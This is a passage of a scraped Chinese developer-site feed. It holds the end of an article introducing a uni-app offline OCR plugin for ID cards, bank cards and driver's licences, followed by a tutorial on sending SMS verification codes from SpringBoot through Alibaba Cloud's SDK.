<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { parseIdCard, validateIdCard } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/uni_modules/lf-OCR/index.js"</span>;

<span class="hljs-keyword">const</span> result = <span class="hljs-title function_">parseIdCard</span>(ocrText);

<span class="hljs-keyword">if</span> (result.<span class="hljs-property">side</span> === <span class="hljs-string">"front"</span>) {
  <span class="hljs-comment">// 正面：姓名、性别、民族、出生日期、地址、身份证号</span>
  <span class="hljs-keyword">const</span> validation = <span class="hljs-title function_">validateIdCard</span>(result.<span class="hljs-property">idNumber</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"年龄:"</span>, validation.<span class="hljs-property">info</span>.<span class="hljs-property">age</span>);
} <span class="hljs-keyword">else</span> {
  <span class="hljs-comment">// 背面：签发机关、有效期限</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"是否过期:"</span>, result.<span class="hljs-property">isExpired</span>);
}
</code></pre>
<h4 data-id="heading-10">2. 银行卡识别</h4>
<p>支持国内主流银行卡，自动识别银行和卡类型：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { parseBankCard } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/uni_modules/lf-OCR/index.js"</span>;

<span class="hljs-keyword">const</span> result = <span class="hljs-title function_">parseBankCard</span>(ocrText);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"卡号:"</span>, result.<span class="hljs-property">cardNumberFormatted</span>); <span class="hljs-comment">// 6222 0212 3456 7890 123</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"银行:"</span>, result.<span class="hljs-property">bankName</span>); <span class="hljs-comment">// 中国工商银行</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"类型:"</span>, result.<span class="hljs-property">cardType</span>); <span class="hljs-comment">// 借记卡</span>
</code></pre>
<h4 data-id="heading-11">3. 驾驶证识别</h4>
<p>支持主页和副页识别：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { parseDriverLicense } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/uni_modules/lf-OCR/index.js"</span>;

<span class="hljs-keyword">const</span> result = <span class="hljs-title function_">parseDriverLicense</span>(ocrText);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"准驾车型:"</span>, result.<span class="hljs-property">licenseClass</span>); <span class="hljs-comment">// C1</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"车型描述:"</span>, result.<span class="hljs-property">licenseClassDesc</span>); <span class="hljs-comment">// 小型汽车</span>
</code></pre>
<hr/>
<h3 data-id="heading-12">✅ 内置校验功能</h3>
<p>插件不仅能识别文字，还能<strong>验证证件有效性</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> {
  validateIdCard,
  validateBankCard,
} <span class="hljs-keyword">from</span> <span class="hljs-string">"@/uni_modules/lf-OCR/index.js"</span>;

<span class="hljs-comment">// 身份证校验（含校验码验证）</span>
<span class="hljs-keyword">const</span> idResult = <span class="hljs-title function_">validateIdCard</span>(<span class="hljs-string">"110101199001011234"</span>);
<span class="hljs-keyword">if</span> (idResult.<span class="hljs-property">valid</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"地区:"</span>, idResult.<span class="hljs-property">info</span>.<span class="hljs-property">region</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"出生日期:"</span>, idResult.<span class="hljs-property">info</span>.<span class="hljs-property">birthDate</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"性别:"</span>, idResult.<span class="hljs-property">info</span>.<span class="hljs-property">gender</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"年龄:"</span>, idResult.<span class="hljs-property">info</span>.<span class="hljs-property">age</span>);
}

<span class="hljs-comment">// 银行卡校验（Luhn 算法）</span>
<span class="hljs-keyword">const</span> bankResult = <span class="hljs-title function_">validateBankCard</span>(<span class="hljs-string">"6222021234567890123"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"是否有效:"</span>, bankResult.<span class="hljs-property">valid</span>);
</code></pre>
<hr/>
<h3 data-id="heading-13">🔧 扩展开发</h3>
<h4 data-id="heading-14">更换 OCR 模型</h4>
<p>支持替换为其他 ONNX 格式模型：</p>
<pre><code class="hljs language-bash" lang="bash">hybrid/html/models/
├── ppocr_det.onnx      <span class="hljs-comment"># 替换检测模型</span>
├── ppocr_rec.onnx      <span class="hljs-comment"># 替换识别模型</span>
└── ppocr_keys_v1.txt   <span class="hljs-comment"># 替换字典文件</span>
</code></pre>
<h4 data-id="heading-15">新增识别模板</h4>
<p>在 <code>js_sdk/templates/</code> 目录下创建新模板，实现自定义证件解析：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// js_sdk/templates/passport.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">parsePassport</span>(<span class="hljs-params">text, lines = []</span>) {
  <span class="hljs-keyword">const</span> result = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">""</span>,
    <span class="hljs-attr">passportNumber</span>: <span class="hljs-string">""</span>,
    <span class="hljs-attr">nationality</span>: <span class="hljs-string">""</span>,
    <span class="hljs-attr">valid</span>: <span class="hljs-literal">false</span>,
  };

  <span class="hljs-comment">// 实现字段提取逻辑...</span>

  <span class="hljs-keyword">return</span> result;
}
</code></pre>
<hr/>
<h3 data-id="heading-16">📱 平台兼容性</h3>

























<table><thead><tr><th>平台</th><th>支持</th></tr></thead><tbody><tr><td>H5</td><td>✅</td></tr><tr><td>App (Android)</td><td>✅</td></tr><tr><td>App (iOS)</td><td>✅</td></tr><tr><td>微信小程序</td><td>❌ (不支持 WebAssembly)</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-17">🔗 项目地址</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fftcvictory%2Flocal-OCR" target="_blank" title="https://github.com/ftcvictory/local-OCR" ref="nofollow noopener noreferrer">GitHub</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Flefan_suitable%2Flocal-ocr" target="_blank" title="https://gitee.com/lefan_suitable/local-ocr" ref="nofollow noopener noreferrer">Gitee</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fext.dcloud.net.cn%2Fplugin%3Fid%3D26471" target="_blank" title="https://ext.dcloud.net.cn/plugin?id=26471" ref="nofollow noopener noreferrer">DCloud 插件市场</a></li>
</ul>
<hr/>
<h3 data-id="heading-18">🤔 常见问题</h3>
<h4 data-id="heading-19">Q: 识别准确率如何？</h4>
<p>A: 基于 PaddleOCR，中文识别准确率可达 95% 以上。建议使用清晰、光线充足的图片。</p>
<h4 data-id="heading-20">Q: 支持哪些证件？</h4>
<p>A: 目前内置身份证、银行卡、驾驶证模板，同时支持通用文字识别。后续会持续更新。</p>
<h4 data-id="heading-21">Q: 如何添加新证件类型？</h4>
<p>A: 在 <code>js_sdk/templates/</code> 目录下创建新模板文件，参考现有模板实现即可。</p>
<hr/>
<h3 data-id="heading-22">📄 开源协议</h3>
<p>MIT License - 可免费用于商业项目</p>
<hr/>
<h3 data-id="heading-23">🙏 致谢</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FPaddlePaddle%2FPaddleOCR" target="_blank" title="https://github.com/PaddlePaddle/PaddleOCR" ref="nofollow noopener noreferrer">PaddleOCR</a> - 提供高质量 OCR 模型</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fonnxruntime.ai%2F" target="_blank" title="https://onnxruntime.ai/" ref="nofollow noopener noreferrer">ONNX Runtime</a> - 跨平台模型推理</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fopencv.org%2F" target="_blank" title="https://opencv.org/" ref="nofollow noopener noreferrer">OpenCV.js</a> - 图像处理</li>
</ul>
<hr/>
<p>如果这个项目对你有帮助，欢迎 ⭐️ Star 支持一下！有问题或建议也欢迎提 Issue 讨论。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[三步搞定短信验证码！SpringBoot集成阿里云短信实战]]></title>    <link>https://juejin.cn/post/7594396523439882275</link>    <guid>https://juejin.cn/post/7594396523439882275</guid>    <pubDate>2026-01-13T03:55:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594396523439882275" data-draft-id="7594396368174104611" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="三步搞定短信验证码！SpringBoot集成阿里云短信实战"/> <meta itemprop="keywords" content="后端,Java,Spring Boot"/> <meta itemprop="datePublished" content="2026-01-13T03:55:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="悟空码字"/> <meta itemprop="url" content="https://juejin.cn/user/3139860942296830"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            三步搞定短信验证码！SpringBoot集成阿里云短信实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3139860942296830/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    悟空码字
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T03:55:01.000Z" title="Tue Jan 13 2026 03:55:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是小悟。</p>
<p>在SpringBoot项目中集成阿里云短信服务，核心是完成一系列前置申请，并调用其官方SDK发送短信。整个流程从前置准备到代码集成，步骤清晰。</p>
<h3 data-id="heading-0">阿里云短信服务概述</h3>
<p>阿里云短信服务提供高并发、安全的全球短信发送能力，支持验证码、通知、营销等场景。其主要特点如下：</p>

























<table><thead><tr><th align="left">特性维度</th><th align="left">具体说明</th></tr></thead><tbody><tr><td align="left"><strong>核心能力</strong></td><td align="left">提供三网合一通道，秒级可达，支持国内及全球200多个国家/地区。</td></tr><tr><td align="left"><strong>安全与管控</strong></td><td align="left">基于阿里云账户与RAM权限管理，支持设置日发送量上限、单用户频次阈值，并具备验证码防盗刷监控。</td></tr><tr><td align="left"><strong>计费模式</strong></td><td align="left">采用<strong>短信套餐包</strong>优先抵扣，超出后<strong>按量计费</strong>的模式。国内验证码/通知短信低至0.045元/条起。</td></tr><tr><td align="left"><strong>使用限制</strong></td><td align="left"><strong>仅支持企业认证账号</strong>；发送前需完成<strong>资质、签名、模板</strong>的申请与审核；对发送频率有严格限制（例如验证码同一号码最多1条/分钟）。</td></tr></tbody></table>
<h3 data-id="heading-1">集成前必须完成的控制台配置</h3>
<p>编写代码前，你必须在阿里云控制台完成一系列配置，这是短信发送的前提。</p>
<ol>
<li><strong>开通服务与购买资源包</strong>
<ul>
<li>完成<strong>企业实名认证</strong>并登录短信服务控制台开通服务。</li>
<li>根据业务需要（国内或国际）<strong>购买短信套餐包</strong>。</li>
</ul>
</li>
<li><strong>创建AccessKey</strong>
<ul>
<li>为安全起见，建议为应用创建<strong>RAM子用户</strong>并授权<code>AliyunDysmsFullAccess</code>策略。</li>
<li>为该子用户创建<strong>AccessKey（AccessKey ID和AccessKey Secret）</strong>，后续代码将使用它调用API。<strong>切勿直接使用主账号的AccessKey</strong>。</li>
</ul>
</li>
<li><strong>申请短信签名与模板</strong>
<ul>
<li><strong>签名</strong>：在“国内消息”或“国际/港澳台消息”菜单下申请。签名是显示在短信开头的标识，如<code>【企业名称】</code>，用于标识发送方。审核通常需2小时。</li>
<li><strong>模板</strong>：短信内容模板，支持变量。例如验证码模板：“您的验证码为：${code}，5分钟内有效。”模板审核同样约需2小时。</li>
<li><strong>重要提示</strong>：签名和模板均<strong>审核通过后</strong>方可使用。国内签名还需完成<strong>运营商实名报备</strong>（需7-15个工作日），报备成功前发送可能失败。</li>
</ul>
</li>
</ol>
<h3 data-id="heading-2">SpringBoot项目集成详细步骤</h3>
<p>完成控制台配置后，即可在SpringBoot项目中集成。</p>
<p><strong>第1步：添加Maven依赖</strong>
在项目的<code>pom.xml</code>中添加阿里云短信服务SDK的依赖。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.aliyun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>dysmsapi20180501<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span> <span class="hljs-comment">&lt;!-- 请使用Maven仓库中的最新版本 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><strong>第2步：配置应用参数</strong>
在<code>application.yml</code>或<code>application.properties</code>中配置必要的参数。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># application.yml 配置示例</span>
<span class="hljs-attr">aliyun:</span>
  <span class="hljs-attr">sms:</span>
    <span class="hljs-comment"># 从控制台获取的AccessKey信息</span>
    <span class="hljs-attr">access-key-id:</span> <span class="hljs-string">your-access-key-id</span>
    <span class="hljs-attr">access-key-secret:</span> <span class="hljs-string">your-access-key-secret</span>
    <span class="hljs-comment"># 短信服务接入点（Endpoint），国内一般为 dysmsapi.aliyuncs.com</span>
    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">dysmsapi.aliyuncs.com</span>
    <span class="hljs-comment"># 控制台申请并通过审核的签名名称（无需加【】）</span>
    <span class="hljs-attr">sign-name:</span> <span class="hljs-string">你的签名</span>
    <span class="hljs-comment"># 控制台申请并通过审核的模板CODE</span>
    <span class="hljs-attr">template-code:</span> <span class="hljs-string">SMS_123456789</span>
</code></pre>
<p><strong>第3步：创建配置类与Service</strong>
创建一个配置类来初始化SDK客户端，并编写发送短信的服务类。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> com.aliyun.dysmsapi20180501.Client;
<span class="hljs-keyword">import</span> com.aliyun.teaopenapi.models.Config;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.<span class="hljs-keyword">annotation</span>.Value;
<span class="hljs-keyword">import</span> org.springframework.context.<span class="hljs-keyword">annotation</span>.Bean;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AliyunSmsConfig</span> {

    <span class="hljs-meta">@Value(<span class="hljs-string">"<span class="hljs-subst">${aliyun.sms.access-key-id}</span>"</span>)</span>
    <span class="hljs-keyword">private</span> String accessKeyId;

    <span class="hljs-meta">@Value(<span class="hljs-string">"<span class="hljs-subst">${aliyun.sms.access-key-secret}</span>"</span>)</span>
    <span class="hljs-keyword">private</span> String accessKeySecret;

    <span class="hljs-meta">@Value(<span class="hljs-string">"<span class="hljs-subst">${aliyun.sms.endpoint}</span>"</span>)</span>
    <span class="hljs-keyword">private</span> String endpoint;

    <span class="hljs-comment">/**
     * 创建并返回阿里云短信服务的Client实例。
     * 该Bean可用于整个Spring容器。
     */</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Client createClient() throws Exception {
        Config config = new Config()
                .setAccessKeyId(accessKeyId)
                .setAccessKeySecret(accessKeySecret);
        config.endpoint = endpoint;
        <span class="hljs-keyword">return</span> new Client(config);
    }
}
</code></pre>

<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> com.aliyun.dysmsapi20180501.Client;
<span class="hljs-keyword">import</span> com.aliyun.dysmsapi20180501.models.SendMessageWithTemplateRequest;
<span class="hljs-keyword">import</span> com.aliyun.dysmsapi20180501.models.SendMessageWithTemplateResponse;
<span class="hljs-keyword">import</span> com.aliyun.teautil.models.RuntimeOptions;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.<span class="hljs-keyword">annotation</span>.Autowired;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.<span class="hljs-keyword">annotation</span>.Value;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> Client smsClient;

    <span class="hljs-meta">@Value(<span class="hljs-string">"<span class="hljs-subst">${aliyun.sms.sign-name}</span>"</span>)</span>
    <span class="hljs-keyword">private</span> String signName;

    <span class="hljs-meta">@Value(<span class="hljs-string">"<span class="hljs-subst">${aliyun.sms.template-code}</span>"</span>)</span>
    <span class="hljs-keyword">private</span> String templateCode;

    <span class="hljs-comment">/**
     * 发送短信验证码
     * <span class="hljs-doctag">@param</span> phoneNumber 目标手机号（国内号码需带国际区号86）
     * <span class="hljs-doctag">@param</span> templateParam 模板变量对应的JSON字符串，如：{"code":"123456"}
     * <span class="hljs-doctag">@return</span> 是否发送成功
     */</span>
    <span class="hljs-keyword">public</span> boolean sendSms(String phoneNumber, String templateParam) {
        <span class="hljs-keyword">try</span> {
            SendMessageWithTemplateRequest request = new SendMessageWithTemplateRequest()
                    .setTo(phoneNumber) <span class="hljs-comment">// 接收方手机号</span>
                    .setSignName(signName) <span class="hljs-comment">// 短信签名</span>
                    .setTemplateCode(templateCode) <span class="hljs-comment">// 短信模板CODE</span>
                    .setTemplateParam(templateParam); <span class="hljs-comment">// 模板变量JSON</span>

            RuntimeOptions runtime = new RuntimeOptions();
            SendMessageWithTemplateResponse response = smsClient.sendMessageWithTemplateWithOptions(request, runtime);

            <span class="hljs-comment">// 根据响应判断是否成功，"OK"表示成功[citation:4]</span>
            <span class="hljs-keyword">return</span> <span class="hljs-string">"OK"</span>.equals(response.getBody().getResponseCode());
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-comment">// 此处应记录日志，并根据业务需要进行异常处理</span>
            e.printStackTrace();
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }
}
</code></pre>
<p><strong>第4步：在Controller中调用</strong>
创建一个简单的控制器来提供发送短信的HTTP接口。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">beans</span>.<span class="hljs-property">factory</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">Autowired</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">web</span>.<span class="hljs-property">bind</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">GetMapping</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">web</span>.<span class="hljs-property">bind</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">RequestParam</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">web</span>.<span class="hljs-property">bind</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">RestController</span>;

<span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">SmsService</span> smsService;

    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/sendCode"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">sendVerificationCode</span>(<span class="hljs-params"><span class="hljs-meta">@RequestParam</span> <span class="hljs-built_in">String</span> phone</span>) {
        <span class="hljs-comment">// 生成随机验证码（示例）</span>
        <span class="hljs-title class_">String</span> code = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">valueOf</span>((int)((<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">9</span> + <span class="hljs-number">1</span>) * <span class="hljs-number">100000</span>));
        <span class="hljs-comment">// 构造模板参数（必须与申请模板时的变量名一致）</span>
        <span class="hljs-title class_">String</span> templateParam = <span class="hljs-string">"{\"code\":\""</span> + code + <span class="hljs-string">"\"}"</span>;

        <span class="hljs-built_in">boolean</span> isSuccess = smsService.<span class="hljs-title function_">sendSms</span>(phone, templateParam);
        <span class="hljs-keyword">if</span> (isSuccess) {
            <span class="hljs-comment">// 在实际业务中，此处应将验证码与手机号关联并存入缓存（如Redis），设置有效期</span>
            <span class="hljs-keyword">return</span> <span class="hljs-string">"验证码发送成功！"</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"验证码发送失败，请稍后重试。"</span>;
        }
    }
}
</code></pre>
<h3 data-id="heading-3">总结</h3>
<p>按照上述步骤，即可在SpringBoot项目中集成阿里云短信。最后，有几个关键点需要注意：</p>
<ol>
<li><strong>资质与审核是关键前提</strong>：务必确保使用<strong>企业认证账号</strong>，并提前完成<strong>签名、模板的申请和审核</strong>。国内签名还需要等待<strong>运营商报备成功</strong>，否则发送会失败。</li>
<li><strong>安全第一</strong>：AccessKey相当于账号密码，<strong>务必通过环境变量或配置服务器管理</strong>，切忌硬编码在代码中提交至版本库。</li>
<li><strong>关注限制与成本</strong>：严格遵守发送频率限制（如1条/分钟/号）。发送测试短信也会产生费用，请注意账户余额。</li>
<li><strong>生产环境建议</strong>：应考虑<strong>异步发送、失败重试、发送状态回执（SmsReport）接收</strong>等机制以提升稳定性和可靠性。</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cba60b7563e14645bc867d4350fda14d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881301&amp;x-signature=zC%2FIyzvoYxElZx3d7DwFBUa5CnY%3D" alt="三步搞定短信验证码！SpringBoot集成阿里云短信实战.png" loading="lazy"/></p>
<p><strong>谢谢你看我的文章，既然看到这里了，如果觉得不错，随手点个赞、转发、在看三连吧，感谢感谢。那我们，下次再见。</strong></p>
<p>您的一键三连，是我更新的最大动力，谢谢</p>
<p>山水有相逢，来日皆可期，谢谢阅读，我们再会</p>
